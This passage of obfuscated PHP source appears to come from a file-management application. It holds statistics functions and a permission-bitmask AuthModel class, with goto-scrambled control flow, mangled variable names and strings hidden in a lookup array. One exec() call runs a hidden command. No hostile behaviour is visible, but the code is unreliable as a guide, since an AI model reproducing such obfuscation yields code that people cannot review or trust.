D‚¹·­èÁ; D‚¹·­èÁ: if ($f¿…Éë”Ò— && $C›£èš¬…æ != $EéŞ‰İ£‘›[1502]) { $fæ·ƒàâ³‰ = $f¿…Éë”Ò—[0][$EéŞ‰İ£‘›[222]]; $cğß÷òĞ‚ = $this->validDate($C›£èš¬…æ, $fæ·ƒàâ³‰); $cäÕ•§†¡ = array(); $a„ÃÛÂ„ = array_to_keyvalue($f¿…Éë”Ò—, $EéŞ‰İ£‘›[222]); foreach ($cğß÷òĞ‚ as $DÍã»¿Úê£) { if (isset($a„ÃÛÂ„[$DÍã»¿Úê£])) { $Aö¨¢ÄÂ¡Ì = $a„ÃÛÂ„[$DÍã»¿Úê£]; } else { $Aö¨¢ÄÂ¡Ì = end($f¿…Éë”Ò—); $Aö¨¢ÄÂ¡Ì[$EéŞ‰İ£‘›[222]] = $DÍã»¿Úê£; if ($fã“ªà£Œ == $EéŞ‰İ£‘›[562]) { $Aö¨¢ÄÂ¡Ì[$EéŞ‰İ£‘›[1619]] = $Aö¨¢ÄÂ¡Ì[$EéŞ‰İ£‘›[1620]] = 0; } } $cäÕ•§†¡[] = $Aö¨¢ÄÂ¡Ì; } $f¿…Éë”Ò— = $cäÕ•§†¡; } $CÅƒÅää = array($EéŞ‰İ£‘›[562] => array($EéŞ‰İ£‘›[725] => LNG($EéŞ‰İ£‘›[1635]), $EéŞ‰İ£‘›[1619] => LNG($EéŞ‰İ£‘›[1636]), $EéŞ‰İ£‘›[1620] => LNG($EéŞ‰İ£‘›[1637])), $EéŞ‰İ£‘›[1621] => array($EéŞ‰İ£‘›[723] => LNG($EéŞ‰İ£‘›[1638]), $EéŞ‰İ£‘›[1623] => LNG($EéŞ‰İ£‘›[1639]), $EéŞ‰İ£‘›[1624] => LNG($EéŞ‰İ£‘›[1640]), $EéŞ‰İ£‘›[1625] => LNG($EéŞ‰İ£‘›[1641]))); $a‘õÆŒÄí­ = array($EéŞ‰İ£‘›[562] => $EéŞ‰İ£‘›[1642], $EéŞ‰İ£‘›[1621] => $EéŞ‰İ£‘›[78]); goto Aøİáó°„; Aøİáó°„: if (empty($f¿…Éë”Ò—)) { $DÍã»¿Úê£ = date($EéŞ‰İ£‘›[1626], strtotime($EéŞ‰İ£‘›[1627])); $b™··øî“é = array($EéŞ‰İ£‘›[222] => $DÍã»¿Úê£); foreach ($CÅƒÅää[$fã“ªà£Œ] as $AĞ½Úˆ»•ß => $CŠ´èìÁÙ§) { $b™··øî“é[$AĞ½Úˆ»•ß] = 0; } $f¿…Éë”Ò—[] = $b™··øî“é; } $AˆÀ½ƒß„Ğ = array(); foreach ($f¿…Éë”Ò— as $CŠ´èìÁÙ§) { if ($fã“ªà£Œ == $EéŞ‰İ£‘›[1621] && $CŠ´èìÁÙ§[$EéŞ‰İ£‘›[1623]] > $CŠ´èìÁÙ§[$EéŞ‰İ£‘›[723]]) { $CŠ´èìÁÙ§[$EéŞ‰İ£‘›[1623]] = $CŠ´èìÁÙ§[$EéŞ‰İ£‘›[723]]; } foreach ($CÅƒÅää[$fã“ªà£Œ] as $AĞ½Úˆ»•ß => $f¼ÎÖÏ¡Åõ) { $Aö¨¢ÄÂ¡Ì = array($EéŞ‰İ£‘›[222] => $CŠ´èìÁÙ§[$EéŞ‰İ£‘›[222]], $EéŞ‰İ£‘›[1432] => $f¼ÎÖÏ¡Åõ); $Aö¨¢ÄÂ¡Ì[$a‘õÆŒÄí­[$fã“ªà£Œ]] = isset($CŠ´èìÁÙ§[$AĞ½Úˆ»•ß]) ? $CŠ´èìÁÙ§[$AĞ½Úˆ»•ß] : 0; $AˆÀ½ƒß„Ğ[] = $Aö¨¢ÄÂ¡Ì; } } goto aÑƒ¶’¾Û; aÑƒ¶’¾Û: return $AˆÀ½ƒß„Ğ; goto EÏÏ¥áÀï‚; EÏÏ¥áÀï‚: } public function validDate($F‚Ğ¼™»Ã, $d©›à›æÇ·) { goto aÏÖÃæ‡ÙÉ; aÏÖÃæ‡ÙÉ: $eÌ¤·‰ÑŠ =& $_SERVER[œº]; $Aö¨¥ÖİöŒ = date($eÌ¤·‰ÑŠ[1626], strtotime($eÌ¤·‰ÑŠ[1627])); $BÑ¦„é‘Š = array($Aö¨¥ÖİöŒ); goto eˆí¦‡—Ôë; eˆí¦‡—Ôë: switch ($F‚Ğ¼™»Ã) { case $eÌ¤·‰ÑŠ[1509]: $BÄ×Úº‚ì« = mktime(0, 0, 0, date($eÌ¤·‰ÑŠ[1643]), date($eÌ¤·‰ÑŠ[1253]) - date($eÌ¤·‰ÑŠ[1315]) + 7 - 7, date($eÌ¤·‰ÑŠ[1644])); $Dëª¹øÙ = 0; do { $fâàñƒÑÅ² = date($eÌ¤·‰ÑŠ[1626], $BÄ×Úº‚ì« - 3600 * 24 * 7 * $Dëª¹øÙ); $BÑ¦„é‘Š[] = $fâàñƒÑÅ²; $Dëª¹øÙ++; } while ($d©›à›æÇ· < $fâàñƒÑÅ²); break; case $eÌ¤·‰ÑŠ[1507]: $Dëª¹øÙ = 1; do { $DéµÏÂŸà‰ = date($eÌ¤·‰ÑŠ[1645], strtotime("\55\x20{$Dëª¹øÙ}\40\155\x6f\156\164\x68\x73")); $BÑ¦„é‘Š[] = $DéµÏÂŸà‰; $Dëª¹øÙ++; } while ($d©›à›æÇ· < $DéµÏÂŸà‰); break; case $eÌ¤·‰ÑŠ[1646]: $E‚¬º¸ Ø‰ = (int) date($eÌ¤·‰ÑŠ[1644], strtotime($d©›à›æÇ·)); $fØ©ŞÀÅóÜ = (int) date($eÌ¤·‰ÑŠ[1644]); if ($E‚¬º¸ Ø‰ >= $fØ©ŞÀÅóÜ) { break; } for ($E‚¬º¸ Ø‰; $E‚¬º¸ Ø‰ < $fØ©ŞÀÅóÜ; $E‚¬º¸ Ø‰++) { $BÑ¦„é‘Š[] = $E‚¬º¸ Ø‰ . $eÌ¤·‰ÑŠ[1647]; } break; default: break; } if ($d©›à›æÇ· > end($BÑ¦„é‘Š)) { array_pop($BÑ¦„é‘Š); } sort($BÑ¦„é‘Š); goto f¾·Ò¼‘; f¾·Ò¼‘: return $BÑ¦„é‘Š; goto a†á½º£ã³; a†á½º£ã³: } public function listTable($F’¢ŠÑŒÚ) { $eßôÕˆ¿™¥ = ucfirst($F’¢ŠÑŒÚ); return Model($eßôÕˆ¿™¥)->listData(); } public function option($BŠŞ³£Àˆ‹) { $F‹¹öŠ—„® = $_SERVER[œº][1648] . ucfirst($BŠŞ³£Àˆ‹); return $this->{$F‹¹öŠ—„®}(); } private function optionUser() { goto c­–ÙÒ•ÈÓ; c­–ÙÒ•ÈÓ: $eÏİÖ´Á«¡ =& $_SERVER[œº]; $cé‡¯»ÈÎ¶ = Model($eÏİÖ´Á«¡[506])->count($eÏİÖ´Á«¡[1528]); $aÄÍ‹ªœ‹¶ = Model($eÏİÖ´Á«¡[506])->where($eÏİÖ´Á«¡[1649])->count($eÏİÖ´Á«¡[1528]); goto d¦”™ØîĞÃ; aœœƒ•†Ê‡: if ($dÀ¨—¯Ïğ < $F‡Øçöß¼) { $dÀ¨—¯Ïğ = $F‡Øçöß¼; } $DÖ¯Ñ½ñ¸¥ = array($eÏİÖ´Á«¡[1650] => array($eÏİÖ´Á«¡[971], $dÀ¨—¯Ïğ)); $CÍ¬¤àç¦ô = (int) Model($eÏİÖ´Á«¡[506])->where($DÖ¯Ñ½ñ¸¥)->count($eÏİÖ´Á«¡[1528]); goto b—£±ƒ•Ş¡; d¦”™ØîĞÃ: $E†™Ò—äõ = intval($GLOBALS[$eÏİÖ´Á«¡[6]][$eÏİÖ´Á«¡[347]][$eÏİÖ´Á«¡[1488]]) / 3600; $dÀ¨—¯Ïğ = strtotime("\55{$E†™Ò—äõ}\x20\150\x6f\165\x72\163"); $F‡Øçöß¼ = strtotime(date($eÏİÖ´Á«¡[1630])); goto aœœƒ•†Ê‡; DÈø·š³Ä: return array($eÏİÖ´Á«¡[719] => (int) $cé‡¯»ÈÎ¶, $eÏİÖ´Á«¡[1651] => (int) ($cé‡¯»ÈÎ¶ - $aÄÍ‹ªœ‹¶), $eÏİÖ´Á«¡[1652] => (int) $aÄÍ‹ªœ‹¶, $eÏİÖ´Á«¡[1653] => (int) $d†¾¦Å½›¤, $eÏİÖ´Á«¡[1654] => $CÍ¬¤àç¦ô); goto Bœ‡œóï‹; b—£±ƒ•Ş¡: if (!$CÍ¬¤àç¦ô) { $CÍ¬¤àç¦ô = 1; } $DÖ¯Ñ½ñ¸¥ = array($eÏİÖ´Á«¡[1650] => array($eÏİÖ´Á«¡[971], $F‡Øçöß¼)); $d†¾¦Å½›¤ = Model($eÏİÖ´Á«¡[506])->where($DÖ¯Ñ½ñ¸¥)->count($eÏİÖ´Á«¡[1528]); goto DÈø·š³Ä; Bœ‡œóï‹: } private function optionFile() { goto cš†—½ä¿‘; BÚŒùÏÙ·Ş: $CÌÚ²ìùìÊ = Model($b””—²‘Ä [790])->where($D­´¿ƒ–è)->sum($b””—²‘Ä [78]); $FŠñˆÍ»¸† = Model($b””—²‘Ä [790])->where($D­´¿ƒ–è)->count($b””—²‘Ä [395]); return array($b””—²‘Ä [723] => $CŒÂõ•Ä²Ç, $b””—²‘Ä [1623] => $Eé¨™¡ÒŠÁ, $b””—²‘Ä [1655] => $CŒÂõ•Ä²Ç - $Eé¨™¡ÒŠÁ, $b””—²‘Ä [1656] => (int) $CÌÚ²ìùìÊ, $b””—²‘Ä [725] => (int) $b¬ˆ½æÂˆ¥, $b””—²‘Ä [1657] => (int) $FŠñˆÍ»¸†); goto D®ğ÷è•­½; cš†—½ä¿‘: $b””—²‘Ä  =& $_SERVER[œº]; $f²½¶Ò‚ = $this->sourceSize(); $CŒÂõ•Ä²Ç = $f²½¶Ò‚[$b””—²‘Ä [78]]; goto fÁ¦À©¯ĞÔ; fÁ¦À©¯ĞÔ: $Eé¨™¡ÒŠÁ = $f²½¶Ò‚[$b””—²‘Ä [1623]]; $b¬ˆ½æÂˆ¥ = Model($b””—²‘Ä [790])->where(array($b””—²‘Ä [403] => 0))->count($b””—²‘Ä [395]); $D­´¿ƒ–è = array($b””—²‘Ä [403] => 0, $b””—²‘Ä [194] => array($b””—²‘Ä [971], strtotime(date($b””—²‘Ä [1630])))); goto BÚŒùÏÙ·Ş; D®ğ÷è•­½: } private function optionAccess() { $eí¿–ï­˜ =& $_SERVER[œº]; return array($eí¿–ï­˜[719] => $this->typeLogCnt(), $eí¿–ï­˜[107] => $this->typeLogCnt($eí¿–ï­˜[107]), $eí¿–ï­˜[430] => $this->typeLogCnt($eí¿–ï­˜[430]), $eí¿–ï­˜[1658] => $this->typeLogCnt($eí¿–ï­˜[1658]), $eí¿–ï­˜[1659] => $this->typeLogCnt($eí¿–ï­˜[1659]), $eí¿–ï­˜[562] => $this->typeLogCnt($eí¿–ï­˜[33], $eí¿–ï­˜[1634])); } private function typeLogCnt($aİô¦«Á„³ = '', $f¶è½ÀÙ½ª = "\x69\x64") { goto Cšööçœ; cßÛ›¿¬‚: $AµÙÑÁÅ¨Æ = array($bŠÍÔÜ°[194] => array($bŠÍÔÜ°[971], $d¥¾Œïê¦»)); if ($aİô¦«Á„³) { $AµÙÑÁÅ¨Æ[$bŠÍÔÜ°[29]] = array($bŠÍÔÜ°[7], $eŒùÑÄ«Ä[$aİô¦«Á„³]); } $A¶¼òÈéº„ = Model($bŠÍÔÜ°[1633])->where($AµÙÑÁÅ¨Æ)->count($f¶è½ÀÙ½ª); goto F½ç¼Ğ †; F½ç¼Ğ †: return (int) $A¶¼òÈéº„; goto a™‘ùÁÁ°; Cšööçœ: $bŠÍÔÜ° =& $_SERVER[œº]; $eŒùÑÄ«Ä = array($bŠÍÔÜ°[107] => array($bŠÍÔÜ°[1660], $bŠÍÔÜ°[1661]), $bŠÍÔÜ°[430] => array($bŠÍÔÜ°[1662], $bŠÍÔÜ°[1663]), $bŠÍÔÜ°[1658] => array($bŠÍÔÜ°[1664], $bŠÍÔÜ°[1665], $bŠÍÔÜ°[1666]), $bŠÍÔÜ°[1659] => array($bŠÍÔÜ°[1667], $bŠÍÔÜ°[1668]), $bŠÍÔÜ°[1669] => array($bŠÍÔÜ°[1670], $bŠÍÔÜ°[1671], $bŠÍÔÜ°[1672])); $d¥¾Œïê¦» = strtotime(date($bŠÍÔÜ°[1630])); goto cßÛ›¿¬‚; a™‘ùÁÁ°: } private function optionServer() { goto E§‘ƒÕ¯¥×; E§‘ƒÕ¯¥×: $B“‚ĞÃ¬š =& $_SERVER[œº]; $e´ƒß„›ù = $this->diskDriver(); $eÏòŒ·×Äï = KodIO::defaultDriver(); goto EÅº‡ĞÔÀ; c®Œ£ãŸ•“: if ($b„”Æ†¤Ø == $B“‚ĞÃ¬š[755]) { $aÑã˜æ‹Ï” = explode($B“‚ĞÃ¬š[1167], $DƒÛ‹ñ—Ü[$B“‚ĞÃ¬š[931]]); $b„”Æ†¤Ø = $aÑã˜æ‹Ï”[0]; } if ($b„”Æ†¤Ø == $B“‚ĞÃ¬š[758] || $b„”Æ†¤Ø == $B“‚ĞÃ¬š[759]) { $DòËŒ†ÇÈÙ = Model()->db()->query($B“‚ĞÃ¬š[1673]); $E“¦ÊÚÌ° = $DòËŒ†ÇÈÙ[0] && isset($DòËŒ†ÇÈÙ[0][$B“‚ĞÃ¬š[1431]]) ? $DòËŒ†ÇÈÙ[0][$B“‚ĞÃ¬š[1431]] : 0; $b„”Æ†¤Ø = $B“‚ĞÃ¬š[1674] . ($E“¦ÊÚÌ° ? $B“‚ĞÃ¬š[8] . $E“¦ÊÚÌ° : $B“‚ĞÃ¬š[33]); } $Aâ¿¦îâÃ = $GLOBALS[$B“‚ĞÃ¬š[6]][$B“‚ĞÃ¬š[347]][$B“‚ĞÃ¬š[792]]; goto E¯Ú˜°¥æ; E¯Ú˜°¥æ: return array($B“‚ĞÃ¬š[1675] => $e´ƒß„›ù ? $e´ƒß„›ù[$B“‚ĞÃ¬š[1676]] : 0, $B“‚ĞÃ¬š[1677] => $e´ƒß„›ù ? $e´ƒß„›ù[$B“‚ĞÃ¬š[1678]] : 0, $B“‚ĞÃ¬š[1679] => (int) $eÏòŒ·×Äï[$B“‚ĞÃ¬š[1676]] * 1024 * 1024 * 1024, $B“‚ĞÃ¬š[1680] => (int) $a ´âæ¦öÛ, $B“‚ĞÃ¬š[1681] => ucfirst($dê…±Ì¦…˜), $B“‚ĞÃ¬š[1682] => $B“‚ĞÃ¬š[1683] . PHP_VERSION, $B“‚ĞÃ¬š[1684] => phpBuild64() ? 64 : 32, $B“‚ĞÃ¬š[718] => str_replace($B“‚ĞÃ¬š[1685], $B“‚ĞÃ¬š[948], $b„”Æ†¤Ø), $B“‚ĞÃ¬š[347] => ucfirst($Aâ¿¦îâÃ), $B“‚ĞÃ¬š[28] => $_SERVER[$B“‚ĞÃ¬š[1686]]); goto f¯õ¼í·Ñ; c­ßÛî‚©ä: $dê…±Ì¦…˜ = $E÷©£Ïî…[0]; $DƒÛ‹ñ—Ü = $GLOBALS[$B“‚ĞÃ¬š[6]][$B“‚ĞÃ¬š[17]]; $b„”Æ†¤Ø = $DƒÛ‹ñ—Ü[$B“‚ĞÃ¬š[932]]; goto c®Œ£ãŸ•“; EÅº‡ĞÔÀ: $b¡İ¿Ÿ½ í = array($B“‚ĞÃ¬š[782] => $eÏòŒ·×Äï[$B“‚ĞÃ¬š[393]]); $a ´âæ¦öÛ = Model($B“‚ĞÃ¬š[450])->where($b¡İ¿Ÿ½ í)->sum($B“‚ĞÃ¬š[78]); $E÷©£Ïî… = explode($B“‚ĞÃ¬š[50], $_SERVER[$B“‚ĞÃ¬š[142]]); goto c­ßÛî‚©ä; f¯õ¼í·Ñ: } private function diskDriver() { goto Aµ²å“…Úœ; Aµ²å“…Úœ: $C‡Ìµ·Ø¦ =& $_SERVER[œº]; $AÔ¯Ë®•Ï = $C‡Ìµ·Ø¦[8]; $a–¤É·»í² = $GLOBALS[$C‡Ìµ·Ø¦[6]][$C‡Ìµ·Ø¦[1687]] == $C‡Ìµ·Ø¦[1688]; goto eÖ‡•†ŸÃ¹; d¾²ì™µİä: $b¹ÖÍÍÒº = $bĞÆõÍ¼¸Û - @disk_free_space($AÔ¯Ë®•Ï); return array($C‡Ìµ·Ø¦[1676] => $bĞÆõÍ¼¸Û, $C‡Ìµ·Ø¦[1678] => $b¹ÖÍÍÒº); goto Còª¾ÁÃî˜; eÖ‡•†ŸÃ¹: if ($a–¤É·»í²) { $AÔ¯Ë®•Ï = $C‡Ìµ·Ø¦[1689]; if (function_exists($C‡Ìµ·Ø¦[1690])) { exec($C‡Ìµ·Ø¦[1691], $Aš¬ä•‚ƒˆ); $AÔ¯Ë®•Ï = $Aš¬ä•‚ƒˆ[1] . $C‡Ìµ·Ø¦[8]; } } if (!file_exists($AÔ¯Ë®•Ï)) { return; } $bĞÆõÍ¼¸Û = @disk_total_space($AÔ¯Ë®•Ï); goto d¾²ì™µİä; Còª¾ÁÃî˜: } public function fileChart($AÆÙğøãáÄ) { goto c¡ ùâÅ‹õ; c¡ ùâÅ‹õ: $C½¦´é˜š =& $_SERVER[œº]; if (isset($AÆÙğøãáÄ[$C½¦´é˜š[1528]])) { return Model($C½¦´é˜š[790])->userFileTypeProfile($AÆÙğøãáÄ[$C½¦´é˜š[1528]]); } if (isset($AÆÙğøãáÄ[$C½¦´é˜š[1692]])) { return Model($C½¦´é˜š[790])->groupFileTypeProfile($AÆÙğøãáÄ[$C½¦´é˜š[1692]]); } goto AÕÂ¢ßÏˆ; F‹÷æãÎÔÔ: $fŸÅ½è½éÁ[$C½¦´é˜š[404]] = 2; $d¬ãí“İÓ© = Model($C½¦´é˜š[790])->where($fŸÅ½è½éÁ)->sum($C½¦´é˜š[78]); return array($C½¦´é˜š[723] => $FµÜò‡ŸÅ±[$C½¦´é˜š[78]], $C½¦´é˜š[1623] => $FµÜò‡ŸÅ±[$C½¦´é˜š[1623]], $C½¦´é˜š[1624] => (int) $EïŞ‡Âˆâ, $C½¦´é˜š[1625] => (int) $d¬ãí“İÓ©); goto B±ŞÕ˜©…; AÕÂ¢ßÏˆ: $FµÜò‡ŸÅ± = $this->sourceSize(); $fŸÅ½è½éÁ = array($C½¦´é˜š[478] => 0, $C½¦´é˜š[404] => 1); $EïŞ‡Âˆâ = Model($C½¦´é˜š[790])->where($fŸÅ½è½éÁ)->sum($C½¦´é˜š[78]); goto F‹÷æãÎÔÔ; B±ŞÕ˜©…: } private function sourceSize() { $c”æ£ëİ™Õ =& $_SERVER[œº]; $E–å¼¸ø‰ = Model($c”æ£ëİ™Õ[790])->where(array($c”æ£ëİ™Õ[403] => 0))->sum($c”æ£ëİ™Õ[78]); $aÆàåŠÍÓ» = Model($c”æ£ëİ™Õ[450])->sum($c”æ£ëİ™Õ[78]); if ($aÆàåŠÍÓ» > $E–å¼¸ø‰) { $aÆàåŠÍÓ» = $E–å¼¸ø‰; } return array($c”æ£ëİ™Õ[78] => (int) $E–å¼¸ø‰, $c”æ£ëİ™Õ[1623] => (int) $aÆàåŠÍÓ»); } } class AuthModel extends ModelBaseLight { const AUTH_SHOW = 1; const AUTH_VIEW = 2; const AUTH_DOWNLOAD = 4; const AUTH_UPLOAD = 8; const AUTH_EDIT = 16; const AUTH_REMOVE = 32; const AUTH_SHARE = 64; const AUTH_COMMENT = 128; const AUTH_EVENT = 256; const AUTH_ROOT = 33554432; public static function authAll() { return self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT | self::AUTH_ROOT; } public static function authDefault() { $Cë–—à¦Ù =& $_SERVER[œº]; $CŞÓò¶‹¥• = array(array($Cë–—à¦Ù[413] => LNG($Cë–—à¦Ù[1693]), $Cë–—à¦Ù[1694] => $Cë–—à¦Ù[1695], $Cë–—à¦Ù[1696] => 1, $Cë–—à¦Ù[1697] => 1, $Cë–—à¦Ù[1698] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT), array($Cë–—à¦Ù[413] => LNG($Cë–—à¦Ù[1699]), $Cë–—à¦Ù[1694] => $Cë–—à¦Ù[1700], $Cë–—à¦Ù[1696] => 2, $Cë–—à¦Ù[1697] => 1, $Cë–—à¦Ù[1698] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_COMMENT | self::AUTH_EVENT), array($Cë–—à¦Ù[413] => LNG($Cë–—à¦Ù[1701]), $Cë–—à¦Ù[1694] => $Cë–—à¦Ù[1702], $Cë–—à¦Ù[1696] => 3, $Cë–—à¦Ù[1697] => 1, $Cë–—à¦Ù[1698] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_COMMENT | self::AUTH_EVENT), array($Cë–—à¦Ù[413] => LNG($Cë–—à¦Ù[1703]), $Cë–—à¦Ù[1694] => $Cë–—à¦Ù[1704], $Cë–—à¦Ù[1696] => 4, $Cë–—à¦Ù[1697] => 1, $Cë–—à¦Ù[1698] => self::AUTH_SHOW | self::AUTH_VIEW), array($Cë–—à¦Ù[413] => LNG($Cë–—à¦Ù[1705]), $Cë–—à¦Ù[1694] => $Cë–—à¦Ù[1706], $Cë–—à¦Ù[1696] => 5, $Cë–—à¦Ù[1697] => 1, $Cë–—à¦Ù[1698] => self::AUTH_SHOW | self::AUTH_UPLOAD), array($Cë–—à¦Ù[413] => LNG($Cë–—à¦Ù[1707]), $Cë–—à¦Ù[1694] => $Cë–—à¦Ù[1708], $Cë–—à¦Ù[1696] => 6, $Cë–—à¦Ù[1697] => 1, $Cë–—à¦Ù[1698] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT | self::AUTH_ROOT), array($Cë–—à¦Ù[413] => LNG($Cë–—à¦Ù[1709]), $Cë–—à¦Ù[1694] => $Cë–—à¦Ù[1710], $Cë–—à¦Ù[1696] => 7, $Cë–—à¦Ù[1697] => 1, $Cë–—à¦Ù[1698] => 0)); return $CŞÓò¶‹¥•; } public static function authCheck($f¢†–ÂÂ¥ğ, $båÛ‹œåÚ) { $f¢†–ÂÂ¥ğ = intval($f¢†–ÂÂ¥ğ); if ($GLOBALS[$_SERVER[œº][485]]) { return !0; } if ($f¢†–ÂÂ¥ğ <= 0) { return !1; } if (($f¢†–ÂÂ¥ğ & self::AUTH_ROOT) == self::AUTH_ROOT) { return !0; } return !!($f¢†–ÂÂ¥ğ & $båÛ‹œåÚ); } public static function authCheckShow($b–ï¶Õ½Ò) { return self::authCheck($b–ï¶Õ½Ò, self::AUTH_SHOW); } public static function authCheckView($E÷ñŠİƒ¸ß) { return self::authCheck($E÷ñŠİƒ¸ß, self::AUTH_VIEW); } public static function authCheckDownload($E‹…‚Ôªã©) { return self::authCheck($E‹…‚Ôªã©, self::AUTH_DOWNLOAD); } public static function authCheckUpload($D‘ŞãÇ) { return self::authCheck($D‘ŞãÇ, self::AUTH_UPLOAD); } public static function authCheckEdit($Fƒ‘†…İ¶Î) { return self::authCheck($Fƒ‘†…İ¶Î, self::AUTH_EDIT); } public static function authCheckRemove($DùÄ¢¯Ò·Ö) { return self::authCheck($DùÄ¢¯Ò·Ö, self::AUTH_REMOVE); } public static function authCheckShare($cƒÅ¤¶ªÆ) { return self::authCheck($cƒÅ¤¶ªÆ, self::AUTH_SHARE); } public static function authCheckComment($E†«ãéò¥Ü) { return self::authCheck($E†«ãéò¥Ü, self::AUTH_COMMENT); } public static function authCheckEvent($AÅ”…¬ºª§) { return self::authCheck($AÅ”…¬ºª§, self::AUTH_EVENT); } public static function authCheckRoot($C÷—×ğîœí) { return self::authCheck($C÷—×ğîœí, self::AUTH_ROOT); } public static function authCheckAction($C„Ìæä”İ, $däÎ”®½×) { goto B…ó‘…Ä; Dï¨†—á÷›: $Bƒ„àÎŒÂŒ = $FÉŸÓôóŒÉ[$däÎ”®½×]; $C„Ìæä”İ = intval($C„Ìæä”İ); if ($C„Ìæä”İ <= 0) { return !1; } goto dÏÒ¹Ü¦òÍ; B…ó‘…Ä: $d‰Ú—ö¢œ™ =& $_SERVER[œº]; $FÉŸÓôóŒÉ = array($d‰Ú—ö¢œ™[1711] => self::AUTH_VIEW, $d‰Ú—ö¢œ™[1094] => self::AUTH_DOWNLOAD, $d‰Ú—ö¢œ™[107] => self::AUTH_UPLOAD, $d‰Ú—ö¢œ™[1659] => self::AUTH_EDIT, $d‰Ú—ö¢œ™[1658] => self::AUTH_REMOVE, $d‰Ú—ö¢œ™[1669] => self::AUTH_SHARE, $d‰Ú—ö¢œ™[352] => self::AUTH_COMMENT, $d‰Ú—ö¢œ™[1517] => self::AUTH_EVENT, $d‰Ú—ö¢œ™[1712] => self::AUTH_ROOT); if (!isset($FÉŸÓôóŒÉ[$däÎ”®½×])) { return; } goto Dï¨†—á÷›; dÏÒ¹Ü¦òÍ: if (($C„Ìæä”İ & self::AUTH_ROOT) == self::AUTH_ROOT) { return !0; } return !!($C„Ìæä”İ & $Bƒ„àÎŒÂŒ); goto C¯®ñ«¯œŸ; C¯®ñ«¯œŸ: } public static function authDisable($C¼é¼‰£îğ, $c¯åÈ…£‡è) { if (intval($C¼é¼‰£îğ) <= 0) { return 0; } return intval($C¼é¼‰£îğ) & ~$c¯åÈ…£‡è; } public $optionType = "\x53\171\x73\x74\145\x6d\56\x73\x6f\165\x72\x63\x65\101\165\x74\x68\114\151\163\x74"; public $field = array("\x6e\141\x6d\145", "\141\165\x74\150", "\x6c\141\142\145\x6c", "\144\151\163\160\154\141\x79", "\x73\171\163\x74\x65\155", "\163\157\162\x74"); public function initData() { $cíîùŞîš = $this->authDefault(); foreach ($cíîùŞîš as $F´Š“¦ë¢ê) { $this->add($F´Š“¦ë¢ê); } } public function listData($b¦ĞÚ†Ù = false, $AñÔÇÇä« = "\x73\x6f\162\x74", $E·”¹ªÇÂ¹ = false) { return parent::listData($b¦ĞÚ†Ù, $AñÔÇÇä«, $E·”¹ªÇÂ¹); } public function update($Aóª»ˆŞéî, $BĞ‡½Í°Ñƒ) { $f›§…Õø =& $_SERVER[œº]; $cÊ”Á™­íó = parent::listData($Aóª»ˆŞéî); $f»³àñ¦È = $this->findByName($BĞ‡½Í°Ñƒ[$f›§…Õø[28]]); if (!$cÊ”Á™­íó || $f»³àñ¦È && $f»³àñ¦È[$f›§…Õø[393]] != $cÊ”Á™­íó[$f›§…Õø[393]]) { return !1; } $this->filterAuth($BĞ‡½Í°Ñƒ[$f›§…Õø[406]]); return parent::update($Aóª»ˆŞéî, $BĞ‡½Í°Ñƒ); } public function remove($DµòÓÒÛè§) { $AãêÃñØè = parent::listData($DµòÓÒÛè§); if (!$AãêÃñØè || $AãêÃñØè[$_SERVER[œº][1171]]) { return !1; } return parent::remove($DµòÓÒÛè§); } public function add($BÉò‡‘„È = array()) { goto b¬š‹ÒìÅ; E”Š«Êó: return parent::insert($BÉò‡‘„È); goto FñÏâÏ­ÜŒ; b¬š‹ÒìÅ: $Bõ¸ö¿È =& $_SERVER[œº]; if ($this->findByName($BÉò‡‘„È[$Bõ¸ö¿È[28]])) { return !1; } $eåã×Ò’’Ê = array($Bõ¸ö¿È[28] => $Bõ¸ö¿È[33], $Bõ¸ö¿È[406] => 1, $Bõ¸ö¿È[1713] => $Bõ¸ö¿È[1702], $Bõ¸ö¿È[1714] => 1, $Bõ¸ö¿È[1171] => 0, $Bõ¸ö¿È[1715] => 0); goto EËè’²´«Á; EËè’²´«Á: $BÉò‡‘„È = array_merge($eåã×Ò’’Ê, $BÉò‡‘„È); $BÉò‡‘„È[$Bõ¸ö¿È[1715]] = $this->getSort(); $this->filterAuth($BÉò‡‘„È[$Bõ¸ö¿È[406]]); goto E”Š«Êó; FñÏâÏ­ÜŒ: } private function getSort() { $e”£§¨‚†— =& $_SERVER[œº]; $c‚ÖéÂ§Ã = parent::listData(); $bŞ™ßÁ†ëó = array_to_keyvalue($c‚ÖéÂ§Ã, $e”£§¨‚†—[33], $e”£§¨‚†—[1715]); return empty($bŞ™ßÁ†ëó) ? 0 : max($bŞ™ßÁ†ëó) + 1; } private function filterAuth(&$Aó‹èİÅ¡×) { goto fš©Ş¥í; fš©Ş¥í: if (!$Aó‹èİÅ¡×) { return; } $dòéŒº‰ï = array(self::AUTH_SHOW, self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT, self::AUTH_REMOVE, self::AUTH_SHARE, self::AUTH_COMMENT, self::AUTH_EVENT, self::AUTH_ROOT); $eÃŸµ©Œê² = array(); goto CÀö«ë¡ãé; bê¼¯Å¤°¡: foreach ($eÃŸµ©Œê² as $AßÌ¹Ìíå¯) { if (isset($AÜÏŒ†è[$AßÌ¹Ìíå¯])) { $eÃŸµ©Œê² = array_merge($eÃŸµ©Œê², $AÜÏŒ†è[$AßÌ¹Ìíå¯]); } } $eÃŸµ©Œê²[] = self::AUTH_SHOW; $Aó‹èİÅ¡× = array_sum(array_unique($eÃŸµ©Œê²)); goto BÂÈ˜»¼Ôç; CÀö«ë¡ãé: foreach ($dòéŒº‰ï as $AßÌ¹Ìíå¯) { if ($Aó‹èİÅ¡× & $AßÌ¹Ìíå¯) { $eÃŸµ©Œê²[] = $AßÌ¹Ìíå¯; } } if (in_array(self::AUTH_ROOT, 